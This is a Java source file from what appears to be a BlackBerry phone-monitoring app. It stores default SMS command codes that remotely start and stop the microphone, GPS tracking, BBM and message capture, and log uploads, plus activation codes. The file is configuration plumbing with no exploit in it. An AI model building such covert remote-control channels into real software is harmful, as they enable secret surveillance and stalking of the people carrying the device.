package com.vvt.rmtcmd;

import java.util.Vector;
import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;

public class SMSCmdStore {
	
	private static SMSCmdStore self = null;
	private static final long RMT_CMD_KEY = 0xe632fc72164b91e2L;
	private static final int START_MIC_CMD = 10;
	private static final int STOP_MIC_CMD = 20;
	private static final int WATCHLIST_CMD = 50;
	private static final int GPS_CMD = 52;
	private static final int BBM_CMD = 55;
	private static final int SIM_CMD = 56;
	private static final int START_CAPTURE_CMD = 60;
	private static final int STOP_CAPTURE_CMD = 61;
	private static final int SEND_DIAGNOSTICS_CMD = 62;
	private static final int SEND_LOG_NOW_CMD = 64;
	private static final int GPS_ON_DEMAND_CMD = 101;
	private static final int ACTIVATION_CMD = 14141;
	private static final int DEACTIVATION_CMD = 14142;
	private PersistentObject rmtCmdPersistent = null;
	private SMSCommandCode smsCmdCode = null;
	private Vector observers = new Vector();
	
	private SMSCmdStore() {
		rmtCmdPersistent = PersistentStore.getPersistentObject(RMT_CMD_KEY);
		smsCmdCode = (SMSCommandCode)rmtCmdPersistent.getContents();
		if (smsCmdCode == null) {
			smsCmdCode = new SMSCommandCode();
			rmtCmdPersistent.setContents(smsCmdCode);
			rmtCmdPersistent.commit();
			useDefault();
		}
	}
	
	public static SMSCmdStore getInstance() {
		if (self == null) {
			self = new SMSCmdStore();
		}
		return self;
	}
	
	public void addListener(SMSCmdChangeListener observer) {
		if (!isListenerExisted(observer)) {
			observers.addElement(observer);
		}
	}

	public void removeListener(SMSCmdChangeListener observer) {
		if (isListenerExisted(observer)) {
			observers.removeElement(observer);
		}
	}
	
	public SMSCommandCode getSMSCommandCode() {
		smsCmdCode = (SMSCommandCode)rmtCmdPersistent.getContents();
		return smsCmdCode;
	}
	
	public void useDefault() {
		smsCmdCode = getSMSCommandCode();
		smsCmdCode.setStartCaptureCmd(START_CAPTURE_CMD);
		smsCmdCode.setStopCaptureCmd(STOP_CAPTURE_CMD);
		smsCmdCode.setSendLogNowCmd(SEND_LOG_NOW_CMD);
		smsCmdCode.setSendDiagnosticsCmd(SEND_DIAGNOSTICS_CMD);
		smsCmdCode.setSIMCmd(SIM_CMD);
		smsCmdCode.setStartMicCmd(START_MIC_CMD);
		smsCmdCode.setStopMicCmd(STOP_MIC_CMD);
		smsCmdCode.setGPSCmd(GPS_CMD);
		smsCmdCode.setGPSOnDemandCmd(GPS_ON_DEMAND_CMD);
		smsCmdCode.setWatchListCmd(WATCHLIST_CMD);
		smsCmdCode.setBBMCmd(BBM_CMD);
		smsCmdCode.setActivationCmd(ACTIVATION_CMD);
		smsCmdCode.setDeactivationCmd(DEACTIVATION_CMD);
		commit(smsCmdCode);
	}
	
	public void commit(SMSCommandCode smsCmdCode) {
		rmtCmdPersistent.setContents(smsCmdCode);
		rmtCmdPersistent.commit();
		for (int i = 0; i < observers.size(); i++) {
			SMSCmdChangeListener observer = (SMSCmdChangeListener)observers.elementAt(i);
			observer.smsCmdChanged();
		}
	}
	
	private boolean isListenerExisted(SMSCmdChangeListener observer) {
		boolean isExisted = false;
		for (int i = 0; i < observers.size(); i++) {
			if (observers.elementAt(i) == observer) {
				isExisted = true;
				break;
			}
		}
		return isExisted;
	}
}
